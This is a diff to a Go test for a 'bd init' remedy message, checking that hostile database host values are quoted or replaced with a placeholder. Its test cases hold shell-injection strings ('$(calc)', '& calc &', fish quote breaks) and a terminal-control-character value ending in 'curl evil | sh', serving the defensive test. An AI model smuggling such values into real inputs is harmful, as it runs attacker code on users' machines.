@@ -564,7 +564,8 @@ func TestEnsureBeadsDirForPathRefusesTargetsItWouldHide(t *testing.T) {
 // passed quoted for the shell it is pasted into (TestShellQuotedFor), with the
 // port the target's own config names, else 3307. A host no quoting passes on
 // unchanged there, such as one that would run a command from cmd.exe,
-// PowerShell or fish, is left as a <host> placeholder that the note names.
+// PowerShell or fish, or redraw the printed command with terminal control
+// characters, is left as a <host> placeholder that the note names, escaped.
 func TestServerInitRemedy(t *testing.T) {
 	t.Parallel()
 	const crafted = `x" & calc & "$(calc)`
@@ -578,6 +579,7 @@ func TestServerInitRemedy(t *testing.T) {
 		{name: "crafted host on POSIX", goos: "darwin", initCmd: "bd init", host: crafted, want: `bd init --server-host 'x" & calc & "$(calc)' --server-port 3307 --database <name>`},
 		{name: "crafted host on Windows", goos: "windows", initCmd: "bd init --server", host: crafted, want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\" & calc & \"$(calc)" for <host>`},
 		{name: "PowerShell subexpression host on Windows", goos: "windows", initCmd: "bd init", host: "$(calc)", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "$(calc)" for <host>`},
+		{name: "host with terminal control characters on POSIX", goos: "linux", initCmd: "bd init", host: "\x1b[2K\rbd init --server-host db; curl evil | sh #", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "\x1b[2K\rbd init --server-host db; curl evil | sh #" for <host>`},
 		{name: "host fish would end the quotes at on POSIX", goos: "linux", initCmd: "bd init --server", host: `x\'; calc #`, want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\\'; calc #" for <host>`},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
